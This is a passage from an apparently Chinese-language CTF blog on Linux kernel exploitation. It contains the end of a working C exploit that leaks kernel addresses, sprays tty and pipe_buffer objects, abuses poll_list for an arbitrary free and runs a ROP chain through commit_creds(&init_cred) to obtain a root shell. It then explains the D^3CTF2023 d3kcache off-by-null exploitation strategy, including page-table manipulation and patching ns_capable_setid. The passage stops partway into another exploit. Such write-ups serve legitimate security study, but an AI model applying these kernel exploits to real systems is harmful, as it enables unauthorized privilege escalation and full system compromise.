&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking kernel pointer...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_NUM; i++) &#123;</span><br><span class="line">        <span class="type">int</span> len = key_read(i, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        kernel_offset = search_kernel_offset(buf, len);</span><br><span class="line">        <span class="keyword">if</span> (kernel_offset != INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">            qword_dump(<span class="string">&quot;dump leak memory&quot;</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">            target_key = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_offset == INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to leak kernel offset,try again.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    push_rsi_pop_rsp_ret += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    pop_r14_pop_r15_ret += kernel_offset;</span><br><span class="line">    find_task_by_vpid += kernel_offset;</span><br><span class="line">    init_fs += kernel_offset;</span><br><span class="line">    pop_rcx_ret += kernel_offset;</span><br><span class="line">    add_rax_rcx_ret += kernel_offset;</span><br><span class="line">    mov_mmrax_rbx_pop_rbx_ret += kernel_offset;</span><br><span class="line">    pop_rbx_ret += kernel_offset;</span><br><span class="line">    swapgs_ret += kernel_offset;</span><br><span class="line">    iretq += kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Freeing user keys...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != target_key) &#123;</span><br><span class="line">            key_unlink(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying tty_file_private / tty_struct structures...&quot;</span>);</span><br><span class="line">    <span class="type">int</span> tty_fd[TTY_NUM];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TTY_NUM; i++) &#123;</span><br><span class="line">        tty_fd[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span> (tty_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] failed to open ptmx&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking heap pointer...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> target_object = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> len = key_read(target_key, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    qword_dump(<span class="string">&quot;dump leak memory&quot;</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> *<span class="title">head</span> =</span> (<span class="type">void</span> *) &amp;buf[i];</span><br><span class="line">        <span class="keyword">if</span> (is_dir_mapping_addr((<span class="type">size_t</span>) head-&gt;tty) &amp;&amp; !(((<span class="type">size_t</span>) head-&gt;tty) &amp; <span class="number">0xFF</span>)</span><br><span class="line">            &amp;&amp; head-&gt;<span class="built_in">list</span>.next == head-&gt;<span class="built_in">list</span>.prev &amp;&amp; head-&gt;<span class="built_in">list</span>.prev != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            qword_dump(<span class="string">&quot;leak tty_struct addr from tty_file_private&quot;</span>, &amp;buf[i], <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_file_private));</span><br><span class="line">            target_object = (<span class="type">size_t</span>) head-&gt;tty;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] tty_struct addr: %p\n&quot;</span>, target_object);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (target_object == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to leak tty_struct addr.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Freeing seq_operation structures...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2048</span>; i &lt; SEQ_NUM; i++) &#123;</span><br><span class="line">        close(seq_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Creating poll threads...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">192</span>; i++) &#123;</span><br><span class="line">        create_poll_thread(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> poll_list) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd), <span class="number">3000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    wait_poll_start();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Freeing corrupted key...&quot;</span>);</span><br><span class="line">    key_unlink(target_key);</span><br><span class="line">    sleep(<span class="number">1</span>); <span class="comment">// GC key</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Overwriting poll_list next pointer...&quot;</span>);</span><br><span class="line">    <span class="type">char</span> key[<span class="number">32</span>] = &#123;&#125;;</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">0</span>] = target_object - <span class="number">0x18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_NUM; i++) &#123;</span><br><span class="line">        setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;sky123&quot;</span>, buf, <span class="number">32</span>, XATTR_CREATE);</span><br><span class="line">        key_alloc(i, key, <span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Freeing tty_struct structures...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TTY_NUM; i++) &#123;</span><br><span class="line">        close(tty_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>); <span class="comment">// GC TTYs</span></span><br><span class="line">    <span class="type">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying pipe_bufer structures...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        pipe(pipe_fd[i]);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;sky123&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Triggering arbitrary free...&quot;</span>);</span><br><span class="line">    join_poll_threads(<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">struct</span> pipe_bufer *) buf)-&gt;ops = (<span class="type">void</span> *) (target_object + <span class="number">0x300</span>);</span><br><span class="line">    ((<span class="keyword">struct</span> pipe_buf_operations *) &amp;buf[<span class="number">0x300</span>])-&gt;release = (<span class="type">void</span> *) push_rsi_pop_rsp_ret;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) buf;</span><br><span class="line"></span><br><span class="line">    *rop++ = pop_r14_pop_r15_ret;</span><br><span class="line">    rop++;</span><br><span class="line">    rop++; <span class="comment">// ops</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// commit_creds(&amp;init_creds)</span></span><br><span class="line">    *rop++ = pop_rdi_ret;</span><br><span class="line">    *rop++ = init_cred;</span><br><span class="line">    *rop++ = commit_creds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// current = find_task_by_vpid(getpid())</span></span><br><span class="line">    *rop++ = pop_rdi_ret;</span><br><span class="line">    *rop++ = getpid();</span><br><span class="line">    *rop++ = find_task_by_vpid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// current-&gt;fs = &amp;init_fs</span></span><br><span class="line">    *rop++ = pop_rcx_ret;</span><br><span class="line">    *rop++ = <span class="number">0x6e0</span>;</span><br><span class="line">    *rop++ = add_rax_rcx_ret;</span><br><span class="line">    *rop++ = pop_rbx_ret;</span><br><span class="line">    *rop++ = init_fs;</span><br><span class="line">    *rop++ = mov_mmrax_rbx_pop_rbx_ret;</span><br><span class="line">    rop++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// back to user</span></span><br><span class="line">    *rop++ = swapgs_ret;</span><br><span class="line">    *rop++ = iretq;</span><br><span class="line">    *rop++ = (<span class="type">uint64_t</span>) get_shell;</span><br><span class="line">    *rop++ = user_cs;</span><br><span class="line">    *rop++ = user_rflags;</span><br><span class="line">    *rop++ = user_sp;</span><br><span class="line">    *rop++ = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying ROP chain...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">        key_alloc(i, buf, <span class="number">1024</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking control flow...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<h3 id="例题d3ctf2023-d3kcache">例题：D^3CTF2023 d3kcache</h3>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/D%5E3CTF2023_d3kcache" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>题目驱动使用独立的 <code>kmem_cache</code> ，object 大小为
0x800。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">kcache_jar = kmem_cache_create_usercopy(<span class="string">&quot;kcache_jar&quot;</span>, <span class="number">0x800</span>LL, <span class="number">0LL</span>, <span class="number">0x4042000</span>LL, <span class="number">0LL</span>, <span class="number">0x800</span>LL, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure></div>
<p>存在 off by null 漏洞。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a2 == <span class="number">0x514</span> )                        <span class="comment">// write</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)input.index &lt;= <span class="number">0xF</span>uLL &amp;&amp; ptr_list[input.index].ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = input.size;</span><br><span class="line">    <span class="keyword">if</span> ( input.size &gt; <span class="number">0x800</span>u || (<span class="type">unsigned</span> <span class="type">int</span>)(input.size + cur_read_len[input.index].len) &gt;= <span class="number">0x800</span> )</span><br><span class="line">      v7 = <span class="number">2048</span> - cur_read_len[input.index].len;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">      BUG();</span><br><span class="line">    v8 = &amp;ptr_list[input.index].ptr[cur_read_len[input.index].len];</span><br><span class="line">    v9 = (<span class="type">unsigned</span> <span class="type">int</span>)v7;</span><br><span class="line">    v10 = input.buf;</span><br><span class="line">    _check_object_size(v8, (<span class="type">unsigned</span> <span class="type">int</span>)v7, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(v8, v10, v9) )</span><br><span class="line">    &#123;</span><br><span class="line">      v8[v9] = <span class="number">0</span>;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于 <code>kcache_jar</code>
独立，因此只能考虑页级堆风水。通过调试发现 <code>kcache_jar</code> 的
<code>oo = 196624</code> 因此向 buddy system 请求的内存页的
<code>order</code> 为 <code>196624 &gt;&gt; 16 = 3</code>
。为了提高成功率，溢出修改的结构的所使用的 <code>kmem_cache</code> 的
<code>order</code> 也要为 3 。</p>
<p>这里我们使用 <code>pipe_buffer</code>
作为被修改的对象，为了使得其所使用的 <code>kmem_cache</code> 的
<code>order</code> 为 3 。我们需要调整 pipe 所使用的
<code>pipe_buffer</code> 数组的大小。这里我们使用的
<code>kmem_cache</code> 为 <code>kmalloc-2k</code> ，该
<code>kmem_cache</code> 的 <code>oo</code> 为 196624，对应的
<code>order</code> 为 3 。</p>
<p><code>pipe_fcntl</code> 传入参数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 时最终在
<code>pipe_resize_ring</code> 函数中 <code>kcalloc</code>
申请的内存大小为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">⌊</mo><mfrac><msup><mn>2</mn><mrow><mo fence="true">⌈</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>n</mi><mo fence="true">⌉</mo></mrow></msup><msup><mn>2</mn><mn>12</mn></msup></mfrac><mo fence="true">⌋</mo></mrow><mo>×</mo><mtext>sizeof(struct pipe_buffer)</mtext></mrow><annotation encoding="application/x-tex">\left \lfloor\frac{2^{\left \lceil \log_2n \right \rceil }}{2^{12}}\right \rfloor \times  \text{sizeof(struct pipe\_buffer)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.8em;vertical-align:-0.65em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">⌊</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0707em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9667em;"><span style="top:-2.9667em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">⌈</span></span><span class="mop mtight"><span class="mop mtight"><span class="mtight">l</span><span class="mtight">o</span><span class="mtight" style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-right:0.1em;"><span class="pstrut" style="height:2.6444em;"></span><span class="mord mtight">2</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2996em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.2453em;"></span><span class="mord mathnormal mtight">n</span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">⌉</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">⌋</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">sizeof(struct pipe_buffer)</span></span></span></span></span> ，因此我们只需要传入的参数为
<code>0x1000*64</code> 则会申请 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">⌊</mo><mfrac><msup><mn>2</mn><mrow><mo fence="true">⌈</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mo stretchy="false">(</mo><mtext>0x1000</mtext><mo>×</mo><mn>64</mn><mo stretchy="false">)</mo><mo fence="true">⌉</mo></mrow></msup><msup><mn>2</mn><mn>12</mn></msup></mfrac><mo fence="true">⌋</mo></mrow><mo>×</mo><mn>40</mn><mo>=</mo><mtext>0xa00</mtext></mrow><annotation encoding="application/x-tex">\left \lfloor\frac{2^{\left \lceil \log_2(\text{0x1000}\times 64) \right \rceil }}{2^{12}}\right \rfloor \times  40=\text{0xa00}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.8em;vertical-align:-0.65em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">⌊</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0707em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9667em;"><span style="top:-2.9667em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">⌈</span></span><span class="mop mtight"><span class="mop mtight"><span class="mtight">l</span><span class="mtight">o</span><span class="mtight" style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-right:0.1em;"><span class="pstrut" style="height:2.6444em;"></span><span class="mord mtight">2</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2996em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord text mtight"><span class="mord mtight">0x1000</span></span><span class="mbin mtight">×</span><span class="mord mtight">64</span><span class="mclose mtight">)</span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">⌉</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">⌋</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">40</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord text"><span class="mord">0xa00</span></span></span></span></span> 大小的内存，即可在
<code>kmalloc-4k</code> 中申请内存（实际调试发现 <code>kmalloc-4k</code>
的 <code>kmem_cache</code> 的 <code>oo</code> 为 196616 ，即
<code>order</code> 为 3，因此和 <code>kmalloc-2k</code>
效果一样，这里当然也可以传入例如 <code>0x1000*32</code> 在
<code>kmalloc-2k</code> 中申请内存。另外具体调试方法可以在
<code>pipe_resize_ring</code> 函数的 <code>kmalloc</code>
中下断点然后往里跟到 <code>_kmem_cache_alloc_node</code> 函数查看使用的
<code>kmem_cache</code> 。）。</p>
<p>通过溢出，我们修改了相邻内存页中的 <code>pipe_buffer</code>
，使其指向另一个 <code>page</code> 结构体。通过读取
<code>pipe_buffer</code> 中的内容我们可以获得
<code>orig_pipe_id[0]</code> 和 <code>victim_pipe_id[0]</code> 。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/345b5393d5fc266fe2c602a4a2ea69ec.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<p>我们关闭 <code>orig_pipe_id[0]</code> 对应的 pipe，然后调用
<code>pipe_fcntl</code> 重新分配其余的 pipe 的 <code>pipe_buffer</code>
使得存在新的 <code>pipe_buffer</code> 位于 <code>orig_pipe_id[0]</code>
释放的 <code>page</code> 上。为了达到这个效果， <code>pipe_fcntl</code>
传入的参数为 <code>0x1000*(96/sizeof(struct pipe_buffer))</code>
，这样会在 <code>kmalloc-96</code> 申请 <code>pipe_buffer</code>
内存，该 <code>kmem_cache</code> 的 <code>oo</code> 为 42，对应的
<code>order</code> 为 0 。</p>
<p>通过对 <code>victim_pipe_id[0]</code>
的读取和写入，我们实现了下图所示效果，同时也获取了一个 <code>page</code>
结构体的地址。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/07a5610ff6afc60090611b81557afbca.png"
                     
alt="在这里插入图片描述" 
                > 再一次采取上面的步骤，构造三个自写管道
<code>evil_pipe_id[0]</code> ，<code>evil_pipe_id[1]</code> 和
<code>evil_pipe_id[2]</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2c6231401894229425c951b82a28b330.png"
                     
alt="在这里插入图片描述" 
                > 由于 3 个 pipe 都可以自写，因此可以利用三个
pipe 实现任意地址读写原语。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e83d3ffba3c51f0998aa1914177f87fd.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<ul>
<li>第一个管道用以进行内存空间中的任意读写，我们通过修改其
<code>page</code> 指针完成。</li>
<li>第二个管道用以修改第三个管道，使其写入的起始位置指向第一个管道</li>
<li>第三个管道用以修改第一个与第二个管道，使得第一个管道的
<code>page</code>
指针指向指定位置、第二个管道的写入起始位置指向第三个管道。</li>
</ul>
<p>我们目前实现的任意地址读写是在根据 <code>page</code> 结构体地址读取
<code>page</code> 对应内存页的数据。由于 <code>page</code>
数组和线性映射区直接是线性映射的关系，因此我们需要泄露
<code>page_offset_base</code> 和 <code>vmemmap_base</code>
来实现线性映射区地址和 <code>page</code> 结构体地址之间的转换。</p>
<p><code>page_offset_base + 0x9d000</code> 地址处存放
<code>secondary_startup_64</code> 地址，由于前面读取
<code>pipe_buffer</code> 时通过 <code>ops</code>
泄露了内核基址，因此这个地址我们是知道的。我们可以泄露的
<code>page</code> 地址与上 0xfffffffff0000000 为起始
<code>vmemmap_base</code> 向前遍历，检测
<code>vmemmap_base + 0x9d000 / 0x1000 * sizeof(struct page)</code>
地址处的 <code>page</code> 对应的内存页的起始位置是否存储了
<code>secondary_startup_64</code> 的地址，从而获取到
<code>vmemmap_base</code> 。</p>
<p>之后我们遍历 <code>page</code> 搜索当前进程的
<code>task_struct</code> ，在 <code>task_struct</code> 中有一个
<code>ptraced</code>
链表，在没有进程附加的时候是空链表指向自己，因此我们可以得到
<code>task_struct</code>
的地址，并且这个地址是线性映射区上的地址，进而我们可以得到
<code>page_offset_base</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/741539eb7f68cd35f92209d875485993.png"
                     
alt="在这里插入图片描述" 
                >
至此我们实现了线性映射区的任意地址读写（权限允许的情况下）。</p>
<p>现在我们继续扩展利用范围，在线性映射区的任意地址读写的基础上实现真正的任意地址读写，这就需要我们在已知虚拟地址的基础上获取线性映射区中的地址。</p>
<p>由于前面我们已经泄露了 <code>task_struct</code>
的内容，因此我们可以泄露其中 <code>mm_struct</code> 类型的指针
<code>mm</code> 。从而在 <code>mm_struct</code> 中泄露 <code>pgd</code>
。</p>
<p>有了 <code>pgd</code>
之后我们可以进行页表解析获取任意一个虚拟地址对应的物理地址，也就知道了在线性映射区中的地址。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a60ce5d96fe5d2b9fffa5ba9a9d84004.png"
                     
alt="在这里插入图片描述" 
                > 至此我们实现了真正意义上的任意地址读写。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1fa2c1008cb026bd7b41588f1ab6fbbd.png"
                     
alt="在这里插入图片描述" 
                >
有了任意地址读写后，提权方法就很多了，这里列举三种方法。</p>
<p>第一种方法是直接修改 <code>task_struct</code> 的 <code>cred</code>
指针指向 <code>init_cred</code> 或者写 <code>task_struct</code> 对应的
<code>cred</code> 。</p>
<p>第二种方法是向内核栈写 rop 提权。通过 <code>task_struct</code> 的
<code>stack</code>
指针我们可以获取到内核栈的地址。之后我们可以向内核中喷射 rop
实现提权。</p>
<p>第三种方法是向内核中的代码段写 <code>shellcode</code>
实现提权。不过由于内核代码段不可写，因此我们需要先 mmap
一块内存，然后修改这块内存对应的页表，将代码段的物理地址写入页表并设置为可读写权限。这里需要注意的是代码段是
2M 而不是 4K 的内存页，因此解析的是 3 级页表而不是 4 级页表。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9a6420fc82159530d9e3c2af5bbdff3b.png"
                     
alt="在这里插入图片描述" 
                > 至于 shellcode，提权代码不容易实现为
shellcode，但我们可以修改 <code>ns_capable_setid</code> 的返回值恒为 1
。在调用 <code>setresuid(0, 0, 0)</code> 提升权限的时候会通过
<code>ns_capable_setid</code> 判断是否允许，在修改
<code>ns_capable_setid</code> 函数后我们可以使用
<code>setresuid(0, 0, 0)</code> 提权。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 